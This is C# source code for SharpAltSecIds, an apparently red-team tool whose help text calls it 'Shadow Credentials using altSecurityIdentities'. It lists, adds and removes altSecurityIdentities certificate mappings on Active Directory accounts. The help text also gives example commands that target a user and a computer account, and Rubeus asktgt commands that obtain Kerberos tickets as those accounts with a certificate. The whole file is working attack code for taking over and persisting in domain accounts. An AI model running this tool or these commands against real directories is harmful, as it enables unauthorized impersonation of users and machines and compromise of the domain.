using System;
using System.DirectoryServices;

namespace SharpAltSecIds
{
    internal class Program
    {
        static private void PrintHelp()
        {
            Console.WriteLine(
@"
SharpAltSecIds by @bugch3ck.

    Shadow Credentials using altSecurityIdentities.

    Inspired by the blog post ""Microsoft ADCS – Abusing PKI in Active Directory Environment"" 
    by Jean Marsault at Wavestone.

Usage:
    SharpAltSecIds command [options]

Commands:
    l | list               - List current altSecurityIdentities entries.
    a | add                - Add altSecurityIdentities entry for target account.
    r | remove             - Remove altSecurityIdentities entry for target account.
    h | help (default)     - Show this help.

Options:
    /t /target:<account>   - The targeted account (end with $ for computer accounts).
    /a /altsecid:<value>   - The altSecurityIdentity value (X509:<I>...|X509:<SKI>...)

Examples:
    SharpAltSecIds list
    SharpAltSecIds l /target:bob
    SharpAltSecIds a /target:bob ""/altsecid:X509:<I>DC=local,DC=mydomain,CN=myca<S>DC=local,DC=mydomain,CN=mycert""
    SharpAltSecIds r /target:bob ""/altsecid:X509:<I>DC=local,DC=mydomain,CN=myca<S>DC=local,DC=mydomain,CN=mycert""
    SharpAltSecIds add /target:srv01$ /altsecid:X509:<SKI>4b8c70eeaadd62c88487a27c79a444ec930837f4
    SharpAltSecIds remove /target:srv01$ /altsecid:X509:<SKI>4b8c70eeaadd62c88487a27c79a444ec930837f4

Example usage with Rubeus:
    Rubeus asktgt /user:bob /certificate:mycert.pfx /password:thepassword /show /nowrap
    Rubeus asktgt /user:srv01$ /certificate:14350a8f2db76545b81a84587522cb740940f760 /show /nowrap
");
        }
        private static SearchResultCollection FindPrincipals()
        {
            SearchResultCollection searchRes = null;

            try
            {
                DirectorySearcher dirSearch = new DirectorySearcher();
                dirSearch.Filter = "(&(objectClass=user)(altSecurityIdentities=*))";
                dirSearch.PropertiesToLoad.Add("sAMAccountName");
                dirSearch.PropertiesToLoad.Add("altSecurityIdentities");
                searchRes = dirSearch.FindAll();
            }
            catch (Exception ex)
            {
                Console.Error.Write($"[-] Error: {ex.Message}");
            }

            return searchRes;
        }

        private static DirectoryEntry FindPrincipal(string target)
        {
            DirectoryEntry dirEntry = null;

            try
            {
                DirectorySearcher dirSearch = new DirectorySearcher();
                dirSearch.Filter = $"(&(objectClass=user)(sAMAccountName={target}))";
                dirSearch.PropertiesToLoad.Add("sAMAccountName");
                dirSearch.PropertiesToLoad.Add("altSecurityIdentities");
                SearchResult searchRes = dirSearch.FindOne();

                if (searchRes != null)
                {
                    dirEntry = searchRes.GetDirectoryEntry();
                }
            }
            catch (Exception ex)
            {
                Console.Error.Write($"[-] Error: {ex.Message}");
            }
            return dirEntry;
        }

        static bool AddAltSecId(string target, string altsecid)
        {
            bool fRetval = false;
            try
            {
                DirectoryEntry dirEntry = FindPrincipal(target);

                if (dirEntry != null)
                {
                    dirEntry.Properties["altSecurityIdentities"].Add(altsecid);
                    dirEntry.CommitChanges();
                    fRetval = true;
                }
                else 
                {
                    Console.Error.WriteLine($"[-] Error: Target {target} not found.");
                }
            }
            catch (Exception ex)
            {
                Console.Error.Write($"[-] Error: {ex.Message}");
            }

            return fRetval;
        }

        static bool RemoveAltSecId(string target, string altsecid)
        {
            bool fRetval = false;
            try
            {
                DirectoryEntry dirEntry = FindPrincipal(target);

                if (dirEntry != null)
                {
                    dirEntry.Properties["altSecurityIdentities"].Remove(altsecid);
                    dirEntry.CommitChanges();
                    fRetval = true;
                }
                else
                {
                    Console.Error.WriteLine($"[-] Error: Target {target} not found.");
                }
            }
            catch (Exception ex)
            {
                Console.Error.Write($"[-] Error: {ex.Message}");
            }

            return fRetval;
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                PrintHelp();
                return;
            }

            string command = args[0];
            string target = null;
            string altsecid = null;            

            string[] opts = new string[args.Length - 1];
            Array.Copy(args, 1, opts, 0, opts.Length);

            foreach (string a in opts)
            {
                string[] optPair = a.Split(new char[] { ':' }, 2);
                string opt = null;
                string val = null;

                if (optPair.Length > 0) opt = optPair[0];
                if (optPair.Length > 1) val = optPair[1];

                switch (opt)
                {
                    case "/?":
                    case "/h":
                    case "/help":
                        command = "help";
                        break;
                    case "/a":
                    case "/altsecid":
                        altsecid = val;
                        break;
                    case "/t":
                    case "/target":
                        target = val;
                        break;
                    default:
                        Console.Error.WriteLine($"[-] Unknown option {opt}");
                        break;
                }
            }

            switch (command)
            {
                case "l":
                case "list":
                    if (target != null) {
                        DirectoryEntry dirEntry = FindPrincipal(target);
                        if (dirEntry != null)
                        {
                            PropertyCollection props = dirEntry.Properties;
                            if (props.Contains("altSecurityIdentities"))
                            {
                                Console.WriteLine(props["sAMAccountName"][0]);
                                foreach (string altSecId in props["altSecurityIdentities"])
                                {
                                    Console.WriteLine($"  {altSecId}");
                                }
                            }
                        } else
                        {
                            Console.Error.WriteLine("[-] Error: Target not found.");
                        }
                    }
                    else
                    {
                        SearchResultCollection searchRes = FindPrincipals();
                        if (searchRes != null)
                        {
                            foreach (SearchResult res in searchRes)
                            {
                                ResultPropertyCollection props = res.Properties;
                                if (props.Contains("altSecurityIdentities"))
                                {
                                    Console.WriteLine(props["sAMAccountName"][0]);
                                    foreach (string altSecId in props["altSecurityIdentities"])
                                    {
                                        Console.WriteLine($"  {altSecId}");
                                    }
                                }
                            }
                        }
                    }

                    break;
                case "a":
                case "add":
                    if (target == null || target.Trim() == "")
                    {
                        Console.Error.WriteLine("[-] Target cannot be empty.");
                        return;
                    }
                    if (altsecid == null || altsecid.Trim() == "")
                    {
                        Console.Error.WriteLine("[-] Attribute value cannot be empty.");
                        return;
                    }

                    if (AddAltSecId(target, altsecid) == false)
                    {
                        Console.Error.WriteLine("[-] Error: Failed to add value to attribute.");
                    } else
                    {
                        Console.WriteLine($"[+] Added {altsecid} to {target}.");
                    }

                    break;
                case "r":
                case "remove":
                    if (target == null || target.Trim() == "")
                    {
                        Console.Error.WriteLine("[-] Target cannot be empty.");
                        return;
                    }
                    if (altsecid == null || altsecid.Trim() == "")
                    {
                        Console.Error.WriteLine("[-] Attribute value cannot be empty.");
                        return;
                    }

                    if (RemoveAltSecId(target, altsecid) == false)
                    {
                        Console.Error.WriteLine("[-] Error: Failed to remove value to attribute.");
                    } else
                    {
                        Console.WriteLine($"[+] Removed {altsecid} from {target}.");
                    }
                    break;

                case "help":
                default:
                    PrintHelp();
                    break;
            }
            
        }
    }
}
